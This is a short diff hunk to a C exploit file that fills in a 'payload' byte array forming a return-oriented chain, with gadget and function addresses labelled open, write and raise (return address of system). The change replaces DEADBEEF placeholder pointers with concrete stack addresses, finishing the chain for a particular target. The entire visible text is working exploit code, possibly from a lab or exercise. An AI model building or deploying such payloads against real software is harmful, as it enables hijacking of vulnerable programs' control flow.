@@ -25,14 +25,14 @@ unsigned char payload[] =
 	/* ------------------------------------	*/
 	"\xF0\x5A\xF4\xB5"	// Open Address
 	"\xEE\x54\xFC\xB5"	// 3 Pops, then ret
-	"\xDE\xAD\xBE\xEF"	// Pointer to String
+	"\xA0\xB6\xFF\xBF"	// Pointer to String
 	"\x01\x00\x00\x00"	// Flags
 	"\x00\x00\x00\x00"	// 0 (For read)
 
 	"\x10\x60\xF4\xB5"	// Write Address
 	"\xEE\x54\xFC\xB5"	// 3 Pops, then ret
 	"\x03\x00\x00\x00"	// File descriptor (3)
-	"\xDE\xAD\xBE\xEF"	// Pointer to String
+	"\xAC\xB6\xFF\xBF"	// Pointer to String
 	"\x06\x00\x00\x00"	// 6 (The num of chars to write)
 
 	"\x40\x8D\xE8\xB5"	// Raise Address (return address of System)
